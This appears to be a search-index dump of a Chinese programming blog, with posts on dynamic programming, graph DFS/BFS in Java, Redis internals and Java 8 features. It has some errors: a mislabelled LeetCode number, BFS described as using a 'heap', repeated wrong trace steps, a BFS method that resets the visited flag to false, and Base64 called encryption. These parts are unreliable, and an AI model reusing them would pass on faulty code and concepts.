int(11) DEFAULT NULL COMMENT \u0026#39;年龄\u0026#39;, `sex` tinyint(1) DEFAULT NULL COMMENT \u0026#39;性别，1男，2女\u0026#39;, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=\u0026#39;学生表\u0026#39;; "},{"id":56,"href":"/posts/2022/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","title":"动态规划","section":"博客","content":" 动态规划的定义 # 最优子结构（数学优化方法） 动态规划是数学优化的方法指，动态规划要解决的都是问题的最优解。而一个问题的最优解是由它的各个子问题的最优解决定的。 重叠子问题（编程方法） 动态规划是编程的方法指，可以借助编程的技巧去保证每个重叠的子问题只会被求解一次。 因此，判断一个问题能不能称得上是动态规划的问题，需要看它是满足这两个重要的属性：最优子结构（Optimal Substructure）和重叠子问题（Overlapping Sub-problems）。\n动态规划方法 # 递归（Recursion） # 递归的解法需要耗费非常多的重复计算，很多计算都是重叠的，可以使用记忆化的方法避免重叠计算问题。\n记忆化（Memoization） # 记忆化，就是将已经计算出来的结果保存起来，那么下次遇到相同的输入时，直接返回保存好的结果，能够有效节省了大量的计算时间。\n自底向上（Bottom-Up） # 自底向上指，通过状态转移方程，从最小的问题规模入手，不断地增加问题规模，直到所要求的问题规模为止。依然使用记忆化避免重复的计算，不需要递归。\n斐波那契数列 # 写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项。斐波那契数列的定义如下： F(0) = 0, F(1) = 1 F(N) = F(N - 1) + F(N - 2), 其中 N \u0026gt; 1. Java代码\n// 递归的实现 public int fib(int n) { if(n \u0026lt;= 1){ return n; }else{ return fib(n-1)+fib(n-2); } } // 记忆化的实现 public int fib(int n) { // 用于记忆上一次的结果 int[] fn = new int[n+1]; fn[0] = 0; fn[1] = 1; for (int i = 2; i \u0026lt;= n; i++) { fn[i] = fn[i-1] + fn[i-2]; } return fn[n]; } // 自底向上的实现 public int fib(int n) { if(n \u0026lt;= 1) { return n; } int f0 = 0, f1 = 1, res = 0; for(int i = 2; i \u0026lt;= n; i++) { res = f0 + f1; f0= f1; f1= res; } return res; } 动态规划面试题分类 # 线性规划 # 线性，就是说各个子问题的规模以线性的方式分布，并且子问题的最佳状态或结果可以存储在一维线性的数据结构里，例如一维数组，哈希表等。\n解法中，经常会用 dp[i] 去表示第 i 个位置的结果，或者从 0 开始到第 i 个位置为止的最佳状态或结果。例如，最长上升子序列。dp[i] 表示从数组第 0 个元素开始到第i个元素为止的最长的上升子序列。\n第一种形式，当前所求的值仅仅依赖于有限个先前计算好的值，也就是说，dp[i] 仅仅依赖于有限个 dp[j]，其中 j \u0026lt; i。\nLeetCode 第 70 题 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。 每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 注意：给定 n 是一个正整数。 公式：f(x)=f(x−1)+f(x−2) class Solution { public int climbStairs(int n) { if(n \u0026lt;= 2) { return n; } int f1 = 1, f2 = 2, res = 0; for(int i = 3; i \u0026lt;= n; i++) { res = f1+f2; f1=f2; f2=res; } return res; } } LeetCode第 198 题 第二种求解 dp[i] 的形式，当前所求的值依赖于所有先前计算好的值，也就是说，dp[i] 是各个 dp[j] 的某种组合，其中 j 由 0 遍历到 i−1。\nLeetCode 第 516 题 你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。 给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。 示例 ： 输入：[1,2,3,1] 输出：4 解释：偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。 偷窃到的最高金额 = 1 + 3 = 4 。 分析： S 表示前S个房子能拿到的最大金额。 H 表示当前房子有多少钱。 第一间房：s1 = h1 第二间房：s2 = max(h1, h2) 第三间房：s3 = max(s1+h3, s2) 第四间房：s4 = max(s2+h4, s3) 第n间房：sn = max( s(n-2) +hn, s(n-1) )\nclass Solution { public int rob(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int length = nums.length; if (length == 1) { return nums[0]; } int f0= nums[0], f1= Math.max(nums[0], nums[1]); for (int i = 2; i \u0026lt; length; i++) { int temp = f1; f1= Math.max(f0+ nums[i], f1); f0= temp; } return f1; } } 约束规划 # 在普通的线性规划和区间规划里，一般题目有两种需求：统计和最优解。 这些题目不会对输出结果中的元素有什么限制，只要满足最终的一个条件就好了。但是在很多情况下，题目会对输出结果的元素添加一定的限制或约束条件，增加了解题的难度。\n0-1 背包问题 公式：\nB(k, w) = max( B(k-1, w), B(k-1,w-wk) + Vk )\n比较是放了第k个物品后价值大还是不放价值大。 k：前k个物品 w：还剩下多少容量，wk第k个物品重量 v：价值，Vk第k个物品价值 B(k-1, w)：是不放第k个物品 B(k-1,w-wk) + Vk：放了第k个物品 /** * 01背包问题 * @param numOfItems 多少个商品 * @param maxWeight 背包的容量 * @param values 商品的价值 * @param weights 商品的重量 * @return 最在价值 */ public int solution(int numOfItems, int maxWeight, int[] values, int[] weights) { int[][] tmp = new int[numOfItems+1][maxWeight+1]; for (int i = 1; i \u0026lt;= numOfItems ; i++) { int value = values[i-1]; int weight = weights[i-1]; for (int j = 1; j \u0026lt;= maxWeight; j++) { if (j \u0026gt;= weight) { tmp[i][j] = Math.max(tmp[i-1][j], tmp[i-1][j-weight] + value); } else { tmp[i][j] = tmp[i-1][j]; } } } return tmp[numOfItems][maxWeight]; } NP 完全问题 # 该例题为 NP 完全问题。NP 是 Non-deterministic Polynomial 的缩写，中文是非決定性多项式。通俗一点来说，对于这类问题，我们无法在多项式时间内解答。这个概念很难，但是理解好它能帮助你很好的分析时间复杂度。\n多项式级别时间复杂度 O(1)、O(n)、O(n×logn)、O(n2)、O(n3) 等，可以表示为 n 的多项式的组合\n非多项式级别时间复杂度 O(2n)，O(3n) 等指数级别和 O(n!) 等阶乘级别\nEND!\n"},{"id":57,"href":"/posts/2022/%E5%9B%BE%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86/","title":"图深度、广度优先遍历","section":"博客","content":" 图的种类 # 1、无向图（Undirected Graph）：每个顶点和其他顶点通过相连线连接。 2、有向图(Drirected Graph)：有向图中的相连线是有方向的。 3、权重图(Weighted Graph)：在权重图中，每条相连线各自有各自的权重。\n有向图的实现 # 1、矩阵\n使用矩阵来表示图之间的连向关系，用一个一维数组来保存顶点，再二维数组来保存顶点之间的关联。如：\n1-\u0026gt;2有关联，就在edge[1][2]=1来表示。\n2、链表 用链表来表示两个顶点之间的关系，用一维数组来保存各个顶点，再以顶点为头节点，关联边用链表串起来。如：\n0-\u0026gt;1有关联，就用一条链表保存起来。\nDFS与BFS过程 # 深度优先算法主要与栈有关（先进后出），广度优先算法与堆有关（先进先出）。\n深度优先算法 # 过程：\n1、先将0放在栈中 栈中数据：0 打印数据：\n2、0出栈并打印，把0相关联的放入栈中，即把1、2放入栈中 栈中数据：1、2 打印数据：0\n3、1出栈并打印，把1相关联的放入栈中，即把3、4放入栈中 栈中数据：3、4、2 打印数据：0、1\n4、3出栈并打印，3没有相关联的了，就没有数据入栈 栈中数据：4、2 打印数据：0、1、3\n5、4出栈并打印，4没有相关联的了，就没有数据入栈 栈中数据：2 打印数据：0、1、3、4\n6、2出栈并打印，把2相关联的放入栈中，即把5、6放入栈中 栈中数据：5、6 打印数据：0、1、3、4、2\n7、5出栈并打印，5没有相关联的了，就没有数据入栈 栈中数据：6 打印数据：0、1、3、4、2、5\n8、6出栈并打印，6没有相关联的了，就没有数据入栈 栈中数据： 打印数据：0、1、3、4、2、5、6\n9，栈中没有数据，结束。\n广度优先算法 # 过程：\n1、0放入堆中 堆中数据：0 打印数据：\n2、0出堆并打印，把与0相关联的1、2放入堆中 堆中数据：2、1 打印数据：0\n3、1出堆并打印，把与1相关联的3、4放入堆中 堆中数据：4、3、2 打印数据：0、1\n4、2出堆并打印，把与2相关联的5、6放入堆中 堆中数据：6、5、4、3 打印数据：0、1、2\n5、3出堆并打印，因为没有相关联的，所以没有数据放入堆中 堆中数据：6、5、4 打印数据：0、1、2、3\n6、3出堆并打印，因为没有相关联的，所以没有数据放入堆中 堆中数据：6、5 打印数据：0、1、2、3、4\n7、3出堆并打印，因为没有相关联的，所以没有数据放入堆中 堆中数据：6 打印数据：0、1、2、3、4、5\n8、3出堆并打印，因为没有相关联的，所以没有数据放入堆中 堆中数据： 打印数据：0、1、2、3、4、5、6\n9、堆中没有数据，结束。\nJava代码 # 对有向图进行深度优先和广度优先搜索。\npublic class Graph { /** * 顶点数组 */ Vertex[] vertexList; /** * 用于保存顶点边 */ int[][] edges; /** * 最大顶点个数 */ int maxVertexNum; /** * 顶点个数 */ int vertexNum; /** * 顶点类 */ class Vertex { /** * 顶点标识 */ char label; /** * 是否已经访问过 */ boolean wasVisited; public Vertex(char label) { this.label = label; wasVisited = false; } } public Graph(int maxVertexNum) { this.maxVertexNum = maxVertexNum; vertexNum = 0; vertexList = new Vertex[maxVertexNum]; edges = new int[maxVertexNum][maxVertexNum]; } /** * 加入顶点 * @param label 顶点标识 */ public void addVertex(char label) { if (vertexNum \u0026gt; maxVertexNum) { throw new IndexOutOfBoundsException(\u0026#34;加入元素比最超过最大容量\u0026#34;); } vertexList[vertexNum++] = new Vertex(label); } /** * 添加边 * @param from 开始元素 * @param to 指向元素 */ public void addEdge(int from, int to) { edges[from][to] = 1; } /** * 重置顶点被访问标识 */ public void reset() { for (int i = 0; i \u0026lt; vertexList.length; i++) { vertexList[i].wasVisited = false; } } /** * 打印顶点 * @param vertex 顶点 */ public void print(Vertex vertex) { System.out.print(vertex.label + \u0026#34; \u0026#34;); } /** * 深度优先算法 */ public void depthFirstSearch() { // 放顶点数组索引 Stack\u0026lt;Integer\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); // 添加首节点 stack.add(0); while (!stack.isEmpty()) { // 出栈，打印，并设置元素被访问过 Integer pop = stack.pop(); print(vertexList[pop]); vertexList[pop].wasVisited = true; // 添加相关联节点 for (int i = 0; i \u0026lt; edges[pop].length; i++) { if (edges[pop][i] == 1 \u0026amp;\u0026amp; !vertexList[i].wasVisited) { stack.add(i); } } } reset(); } /** * 广度优先算法 */ public void breadthFirstSearch() { // 放顶点数组索引 Queue\u0026lt;Integer\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); // 添加首节点 queue.offer(0); while (!queue.isEmpty()) { // 出队列，打印，并设置被访问过 Integer poll = queue.poll(); print(vertexList[poll]); vertexList[poll].wasVisited = false; // 添加相关联节点 for (int i = 0; i \u0026lt; edges[poll].length; i++) { if (edges[poll][i] == 1 \u0026amp;\u0026amp; !vertexList[i].wasVisited) { queue.add(i); } } } reset(); } /** * 测试图示例如下： * ------------------- * | B -\u0026gt; C | * | ^ | * | | | * | A -\u0026gt; D -\u0026gt; E | * ------------------- */ public static void main(String[] args) { Graph graph = new Graph(5); graph.addVertex(\u0026#39;A\u0026#39;); graph.addVertex(\u0026#39;B\u0026#39;); graph.addVertex(\u0026#39;C\u0026#39;); graph.addVertex(\u0026#39;D\u0026#39;); graph.addVertex(\u0026#39;E\u0026#39;); graph.addEdge(0,1);//AB graph.addEdge(1,2);//BC graph.addEdge(0,3);//AD graph.addEdge(3,4);//DE System.out.println(\u0026#34;深度优先搜索算法：\u0026#34;); graph.depthFirstSearch(); System.out.println(); System.out.println(\u0026#34;---------------\u0026#34;); System.out.println(\u0026#34;广度优先搜索算法：\u0026#34;); graph.breadthFirstSearch(); } } END!\n"},{"id":58,"href":"/posts/2022/Redis/","title":"Redis","section":"博客","content":" Redis的线程模型 # 客户端 socket01 向 redis 的 server socket 请求建立连接，此时 server socket 会产生一个 AE_READABLE 事件，IO 多路复用程序监听到 server socket 产生的事件后，将该事件压入队列中。文件事件分派器从队列中获取该事件，交给连接应答处理器。连接应答处理器会创建一个能与客户端通信的 socket01，并将该 socket01 的 AE_READABLE 事件与命令请求处理器关联。\n假设此时客户端发送了一个 set key value 请求，此时 redis 中的 socket01 会产生 AE_READABLE 事件，IO 多路复用程序将事件压入队列，此时事件分派器从队列中获取到该事件，由于前面 socket01 的 AE_READABLE 事件已经与命令请求处理器关联，因此事件分派器将事件交给命令请求处理器来处理。命令请求处理器读取 socket01 的 key value 并在自己内存中完成 key value 的设置。操作完成后，它会将 socket01 的 AE_WRITABLE 事件与令回复处理器关联。\n如果此时客户端准备好接收返回结果了，那么 redis 中的 socket01 会产生一个 AE_WRITABLE 事件，同样压入队列中，事件分派器找到相关联的命令回复处理器，由命令回复处理器对 socket01 输入本次操作的一个结果，比如 ok，之后解除 socket01 的 AE_WRITABLE 事件与命令回复处理器的关联。\nredis单线程模型效率高 # 对redis里的数据操作的时候是纯内存操作。 文件事件处理器的核心机制是非阻塞的IO多路复用程序。 单线程避免了多线程频繁上下文切换带来的损耗。 redis的过期策略和内存淘汰机制 # 定期删除 定期删除是指redis默认会每隔100ms会随机抽取一些设置了过期时间的key检查是否过期了，如果过期了就删除。\n惰性删除 在你去查key的时候，redis会检查一下这个key是否设置了过期时间和是否已经过期了，如果是redis会删除这个key，并且返回空。\n如果过期了又没有去查这个key,垃圾数据大量堆积，把redis的内存耗尽了怎么办？此时会进行内存淘汰，redis提供了如下策略：\nnoeviction：当内存不足以容纳新写入数据时，新写入数据会报错。 allkeys-lru：当内存不足以容纳新写入数据时，会移除最近最少使用的key。 allkeys-random：当内存不足以容纳新写入数据时，会随机移除某个key。 volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的key。 volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个key。 volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的key优先移除。 redis的持久化机制 # RDB rdb是全量持久化，是在配置文件中指定持久化的间隔时间，然后将内存中的数据集快照写入磁盘，实际操作是fork一个子进程然后将数据集写入一个临时磁盘，字后覆盖掉以前的数据集文件。\nAOF aof可以带来更高的数据安全性，aof中有3中同步策略，（1.每秒同步 2.没执行一个修改命令就同步3.不同步）\n缓存与数据库双写一致性解决方案 # 先更新数据库，再更新缓存 数据库更新成功，缓存更新失败，出现缓存与数据库不一致问题。\n先更新数据库，再删除缓存 删除缓存失败也凉凉。\n先删除缓存中的数据，然后再去更新数据库，最后更新缓存中的数据 单线程一看，没有什么问题，但是多线程时，就出现了问题。\n1-3、用户1请求【更新数据】，先删除缓存数据，再更新数据库中的数据，此时还没有更新完成，数据库中的数据还是旧的。 4-7、这时，用户2请求【获取数据】，从缓存中获取，缓存中没有，从数据库中获取，获取到后更新缓存数据，此时，缓存中的数据为旧数据。 3，8、用户1接着更新完了数据库中的数据，写入缓存时失败了。\n以上的一个流程出现了数据库中的数据与缓存中的数据不一致。\n解决方案：\n（1）如果数据库和缓存更新与读取操作进行串行化，一个队列对应一个工作线程，每个工作线程串行拿到对应的操作，然后一条一条的执行，那么就不会出现这样的问题。\n首先我们的项目里维护一组线程池和内存队列。 更新数据的时候，根据数据的唯一标识将请求路由到一个jvm队列中，去更新数据库,然后请求结束。 读取数据的时候，先查缓存，如果发现数据不在缓存中，那么将根据唯一标识路由之后，也发送同一个jvm内部的队列中，重新读取数据库后更新缓存,最后请求结束。 （2）先更新数据库，再删除缓存，如果删除失败重试。\n（3）先更新数据库，使用订阅数据库log_bin方式，再删除缓存，如果删除失败重试。\n"},{"id":59,"href":"/posts/2022/Java8%E6%96%B0%E7%89%B9%E6%80%A7/","title":"Java8新特性","section":"博客","content":" Lambda表达式 # Lambda 表达式的引入避免了匿名方法的麻烦使用，并且给予Java简单但是强大的函数化的编程能力。\n使用\n// 在1.8之前使用 new Thread(new Runnable() { @Override public void run() { System.out.println(\u0026#34;Before Java8!\u0026#34;); } }).start(); // 在1.8之后使用 new Thread(() -\u0026gt; System.out.println(\u0026#34;In Java8!\u0026#34;) ).start(); 语法\n基本语法: (parameters) -\u0026gt; expression 或 (parameters) -\u0026gt;{ statements; }\n// 1. 不需要参数,返回值为 5 () -\u0026gt; {return 5;} () -\u0026gt; 5 // 只有一行，可以省略{}和return // 2. 接收一个参数(数字类型),返回其2倍的值 (x) -\u0026gt; 2 * x // 3. 接受2个参数(数字),并返回他们的差值 (x, y) -\u0026gt; x – y // 4. 接收2个int型整数,返回他们的和 (int x, int y) -\u0026gt; x + y // 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void) (String s) -\u0026gt; System.out.print(s) Java SE 8中增加了一个新的包：java.util.function\nPredicate\u0026lt;T\u0026gt; -\u0026gt; boolean test(T t); 接收 T 并返回 boolean Consumer\u0026lt;T\u0026gt; -\u0026gt; void accept(T t); 接收 T，不返回值 Function\u0026lt;T, R\u0026gt; -\u0026gt; R apply(T t); 接收 T，返回 R Supplier\u0026lt;T\u0026gt; -\u0026gt; T get(); 提供 T 对象（例如工厂），不接收值 UnaryOperator\u0026lt;T\u0026gt; -\u0026gt; R apply(T t); 接收 T 对象，返回 T BinaryOperator\u0026lt;T\u0026gt; -\u0026gt; R apply(T t, U u); 接收两个 T，返回 T 新的日期API # 1.8之前JDK自带的日期处理类非常不方便，而面对这一缺点，新的java.time包涵盖了所有处理日期，时间，日期/时间，时区，时刻（instants），过程（during）与时钟（clock）的操作。\nLocalDate/LocalTime/LocalDateTime\nLocalDate为日期处理类 LocalTime为时间处理类 LocalDateTime为日期时间处理类 LocalDateTime ldt = LocalDateTime.now(); // 通过静态方法of()方法参数可以指定年月日时分秒 LocalDateTime of = LocalDateTime.of(2018, 12, 30, 20, 20, 20); 与获取相关的方法:get系类的方法 getYear() 获取年 getMinute() 获取分钟 getHour() 获取小时 getDayOfMonth 获得月份天数(1-31) getDayOfYear 获得年份天数(1-366) getDayOfWeek 获得星期几(返回一个 DayOfWeek枚举值) getMonth 获得月份, 返回一个 Month 枚举值 getMonthValue 获得月份(1-12) getYear 获得年份 格式化日期 DateTimeFormatter formatter = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); LocalDateTime ldt = LocalDateTime.parse(\u0026#34;2018-01-21 20:30:36\u0026#34;, formatter); String yyyy = ldt.format(DateTimeFormatter.ofPattern(\u0026#34;yyyy\u0026#34;)); 判断的方法 isAfter()判断一个日期是否在指定日期之后 isBefore()判断一个日期是否在指定日期之前 isEqual(); 判断两个日期是否相同 添加年月日时分秒的方法 plus系列的方法 都会返回一个新的LocalDateTime的对象 LocalDateTime localDateTime = ldt.plusYears(1); LocalDateTime localDateTime1 = ldt.plusMonths(3); LocalDateTime localDateTime2=ldt.plusHours(10); 减去年月日时分秒的方法 minus 系列的方法 LocalDateTime localDateTime2 = ldt.minusYears(8); 指定年月日时分秒的方法 with系列的方法 LocalDateTime localDateTime3 = ldt.withYear(1998); 获取这个月的第几个星期几是几号 TemporalAdjusters.dayOfWeekInMonth(2, DayOfWeek.FRIDAY) 代表的意思是这个月的第二个星期五是几号 LocalDateTime with1 = now.with(TemporalAdjusters.dayOfWeekInMonth(2,DayOfWeek.FRIDAY)); Instant 时间戳\nInstant ins = Instant.now(); ZonedDate、ZonedTime、ZonedDateTime\n带时区的时间或日期 // 查看java8中支持的时区有哪些 Set\u0026lt;String\u0026gt; zones= ZoneId.getAvailableZoneIds(); // 获取一个指定的时区 ZoneId zoneId = ZoneId.of(\u0026#34;Asia/Shanghai\u0026#34;); LocalDateTime localDateTime = LocalDateTime.now(zoneId); ZonedDateTime zonedDateTime = localDateTime.atZone(zoneId); Duration、Period\nDuration:用于计算两个“时间”间隔 Period:用于计算两个“日期”间隔 // 比较之后得到的是一个Duration对象，然后调用对象相应的方法 Instant instant1 = Instant.now(); Instant instant2 = Instant.now(); Duration duration = Duration.between(instant1, instant2); // 比较之后得到的是一个Period对象，然后调用对象相应的方法 LocalDate localDate = LocalDate.now(); LocalDate localDate2 = LocalDate.of(2018, 1, 12); Period period=Period.between(localDate, localDate2); TemporalAdjusters\n这个类在日期调整时非常有用，比如得到当月的第一天、最后一天，当年的第一天、最后一天，下一周或前一周的某天等 LocalDate now = LocalDate.now(); LocalDate with = now.with(TemporalAdjusters.lastDayOfYear()); DateTimeFormatter\n配合LocalDate/LocalTime/LocalDateTime使用，比如想把当前日期格式化成yyyy-MM-dd hh:mm:ss的形式。 LocalDateTime now = LocalDateTime.now(); DateTimeFormatter timeFormat = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); String time = now.format(timeFormat); DateTimeFormatter dateFormat = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); LocalDateTime parse = LocalDateTime.parse(time, timeFormat); 引入Optional # Optional 类的引入是为了解决空指针异常问题，这样我们就不用显式进行空值检测。\n常用操作：\nOptional.of(T t) : 创建一个 Optional 实例 Optional.empty() : 创建一个空的 Optional 实例 Optional.ofNullable(T t):若 t 不为 null,创建 Optional 实例,否则创建空实例 isPresent() : 判断是否包含值 orElse(T t) : 如果调用对象包含值，返回该值，否则返回t orElseGet(Supplier s) :如果调用对象包含值，返回该值，否则返回 s 获取的值 map(Function f): 如果有值对其处理，并返回处理后的Optional，否则返回Optional.empty() flatMap(Function mapper):与 map 类似，要求返回值必须是Optional 使用Base64 # 实例方法 java.util.Base64 类仅由用于获得Base64编码方案的编码器和解码器的静态方法组成。\n方法名 描述 getDecoder() 返回Base64.Decoder解码使用Basic型base64编码方案。 getEncoder() 返回一个Base64.Encoder编码使用Basic型base64编码方案。 getMimeDecoder() 返回一个Base64.Decoder解码使用MIME型BASE64解码方案。 getMimeEncoder() 返回一个Base64.Encoder编码使用MIME型base64编码方案。 getMimeEncoder(int lineLength, byte[] lineSeparator) 返回一个Base64.Encoder ，它使用具有指定行长度和行分隔符的MIME类型base64编码方案进行编码。 getUrlDecoder() 返回Base64.Decoder解码使用URL and Filename safe型base64编码方案。 getUrlEncoder() 返回一个Base64.Encoder编码使用URL and Filename safe型base64编码方案。 Encoder\n方法 描述 byte[] encode(byte[] src) 使用Base64编码方案将指定字节数组中的所有字节编码为新分配的字节数组。 int encode(byte[] src, byte[] dst) 使用Base64编码方案对来自指定字节数组的所有字节进行编码，将生成的字节写入给定的输出字节数组，从偏移0开始。 ByteBuffer encode(ByteBuffer buffer) 使用Base64编码方案将所有剩余字节从指定的字节缓冲区编码到新分配的ByteBuffer中。 String\tencodeToString(byte[] src) 使用Base64编码方案将指定的字节数组编码为字符串。 Base64.Encoder withoutPadding() 返回一个编码器实例，编码器等效于此编码器实例，但不会在编码字节数据的末尾添加任何填充字符。 OutputStream wrap(OutputStream os) 使用Base64编码方案包装用于编码字节数据的输出流。 Decoder\n方法 描述 byte[] decode(byte[] src) 使用Base64编码方案从输入字节数组中解码所有字节，将结果写入新分配的输出字节数组。 int decode(byte[] src, byte[] dst) 使用Base64编码方案从输入字节数组中解码所有字节，将结果写入给定的输出字节数组，从偏移0开始。 ByteBuffer decode(ByteBuffer buffer) 使用Base64编码方案从输入字节缓冲区中解码所有字节，将结果写入新分配的ByteBuffer。 byte[] decode(String src) 使用Base64编码方案将Base64编码的字符串解码为新分配的字节数组。 InputStream wrap(InputStream is) 返回一个输入流，用于解码Base64编码字节流。 简单使用\nString str= \u0026#34;hello world!\u0026#34;; // 加密 String desc = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8)); // 解密 byte[] unDecodeStr = Base64.getDecoder().decode(desc); 接口的默认方法 # 在方法的前面添加 default 实现默认接口的定义。\n以前当需要修改接口的时候，需要修改全部实现该接口的类。而引进的默认方法的目的是为了解决接口的修改与现有的实现不兼容的问题。\n方法引用 # 方法引用是用来直接访问类或者实例的已经存在的方法或者构造方法。方法引用是一个Lambda表达式，其中方法引用的操作符是双冒号\u0026quot;::\u0026quot;。\n类名::静态方法名 对象::实例方法名 对象的超类方法引用语法： super::MethodName 类构造器引用语法： ClassName::new 例如：ArrayList::new 数组构造器引用语法： TypeName[]::new 例如： String[]:new 类名::实例方法名 Stream/ParallelStream 类 # Java 8 API添加了一个新的抽象称为流Stream，把真正的函数式编程风格引入到Java中，可以让你以一种声明的方式处理数据。\nStream/ParallelStream 是对集合的包装,通常和lambda一起使用。 使用lambdas可以支持许多操作,如 map, filter, limit, sorted, count, min, max, sum, collect 等等。其中ParallelStream 并行流是并行执行线程不安全的，同时也是无序的。\n流的生成方法\nCollection接口的stream()或parallelStream()方法 静态的Stream.of()、Stream.empty()方法 Arrays.stream(array, from, to) 静态的Stream.generate()方法生成无限流，接受一个不包含引元的函数 静态的Stream.iterate()方法生成无限流，接受一个种子值以及一个迭代函数 Pattern接口的splitAsStream(input)方法 静态的Files.lines(path)、Files.lines(path, charSet)方法 静态的Stream.concat()方法将两个流连接起来 流的Intermediate方法(中间操作)\nfilter(Predicate) ：将结果为false的元素过滤掉 map(fun) ：转换元素的值，可以用方法引元或者lambda表达式 flatMap(fun) ：若元素是流，将流摊平为正常元素，再进行元素转换 limit(n) ：保留前n个元素 skip(n) ：跳过前n个元素 distinct() ：剔除重复元素 sorted() ：将Comparable元素的流排序 sorted(Comparator) ：将流元素按Comparator排序 peek(fun) ：流不变，但会把每个元素传入fun执行，可以用作调试 流的Terminal方法(终结操作)\n（1）约简操作\nreduce(fun) ：从流中计算某个值，接受一个二元函数作为累积器，从前两个元素开始持续应用它，累积器的中间结果作为第一个参数，流元素作为第二个参数 reduce(a, fun) ：a为幺元值，作为累积器的起点 reduce(a, fun1, fun2) ：与二元变形类似，并发操作中，当累积器的第一个参数与第二个参数都为流元素类型时，可以对各个中间结果也应用累积器进行合并，但是当累积器的第一个参数不是流元素类型而是类型T的时候，各个中间结果也为类型T，需要fun2来将各个中间结果进行合并 （2）收集操作\niterator()： forEach(fun)： forEachOrdered(fun) ：可以应用在并行流上以保持元素顺序 toArray()： toArray(T[] :: new) ：返回正确的元素类型 collect(Collector)： collect(fun1, fun2, fun3) ：fun1转换流元素；fun2为累积器，将fun1的转换结果累积起来；fun3为组合器，将并行处理过程中累积器的各个结果组合起来 （3）查找与收集操作\nmax(Comparator)：返回流中最大值 min(Comparator)：返回流中最小值 count()：返回流中元素个数 findFirst() ：返回第一个元素 findAny() ：返回任意元素 anyMatch(Predicate) ：任意元素匹配时返回true allMatch(Predicate) ：所有元素匹配时返回true noneMatch(Predicate) ：没有元素匹配时返回true 注解相关的改变 # 在Java 8中使用@Repeatable注解定义重复注解。\n// ---没有使用重复注解之前--- public @interface Authority { String role(); } public @interface Authorities { //@Authorities注解作为可以存储多个@Authority注解的容器 Authority[] value(); } public class RepeatAnnotationUseOldVersion { @Authorities({@Authority(role=\u0026#34;Admin\u0026#34;), @Authority(role=\u0026#34;Manager\u0026#34;)}) public void doSomeThing(){ } } // ---使用重复注解之后--- @Repeatable(Authorities.class) public @interface Authority { String role(); } // @Authorities注解作为可以存储多个@Authority注解的容器 public @interface Authorities { Authority[] value(); } public class RepeatAnnotationUseNewVersion { @Authority(role=\u0026#34;Admin\u0026#34;) @Authority(role=\u0026#34;Manager\u0026#34;) public void doSomeThing(){ } } 在 java8 以前，注解只能用在各种程序元素（定义类、定义接口、定义方法、定义成员变量）上。从 java8 开始，类型注解可以用在任何使用到类型的地方。 新增类型：\nTYPE_PARAMETER：表示该注解能写在类型参数的声明语句中。 类型参数声明如： \u0026lt;T\u0026gt;、\u0026lt;T extends Person\u0026gt;。 TYPE_USE：表示注解可以再任何用到类型的地方使用，比如允许在如下位置使用。 全部类型\npublic enum ElementType { // 用于描述类、接口(包括注解类型) 或enum声明 Class, interface TYPE, // 用于描述域 Field declaration FIELD, // 用于描述方法 Method declaration METHOD, // 用于描述参数 Formal parameter declaration PARAMETER, // 用于描述构造器 Constructor declaration CONSTRUCTOR, // 用于描述局部变量 Local variable declaration LOCAL_VARIABLE, // 注解 Annotation type declaration ANNOTATION_TYPE, // 用于描述包 Package declaration PACKAGE, // 1.8,用来标注类型参数 Type parameter declaration TYPE_PARAMETER, // 1.8,能标注任何类型名称 Use of a type TYPE_USE } 简单使用\n// --TYPE_PARAMETER的使用--- @Target(ElementType.TYPE_PARAMETER) @Retention(RetentionPolicy.RUNTIME) public @interface TypeParameterAnnotation { } // 如下是该注解的使用例子 public class TypeParameterClass\u0026lt;@TypeParameterAnnotation T\u0026gt; { public \u0026lt;@TypeParameterAnnotation U\u0026gt; T foo(T t) { return null; } } // ---TYPE_USE的使用--- @Target(ElementType.TYPE_USE) @Retention(RetentionPolicy.RUNTIME) public @interface TypeUseAnnotation { } // 如下是该注解的使用例子 public class TestTypeUse { public static @TypeUseAnnotation class TypeUseClass\u0026lt;@TypeUseAnnotation T\u0026gt; extends @TypeUseAnnotation Object { public void foo(@TypeUseAnnotation T t) throws @TypeUseAnnotation Exception { } } // 如下注解的使用都是合法的 @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unused\u0026#34;, \u0026#34;resource\u0026#34; }) public static void main(String[] args) throws Exception { TypeUseClass\u0026lt;@TypeUseAnnotation String\u0026gt; typeUseClass = new @TypeUseAnnotation TypeUseClass\u0026lt;\u0026gt;(); typeUseClass.foo(\u0026#34;\u0026#34;); List\u0026lt;@TypeUseAnnotation Comparable\u0026gt; list1 = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;? extends Comparable\u0026gt; list2 = new ArrayList\u0026lt;@TypeUseAnnotation Comparable\u0026gt;(); @TypeUseAnnotation String text = (@TypeUseAnnotation String)new Object(); java.util. @TypeUseAnnotation Scanner console = new java.util.@TypeUseAnnotation Scanner(System.in); } } 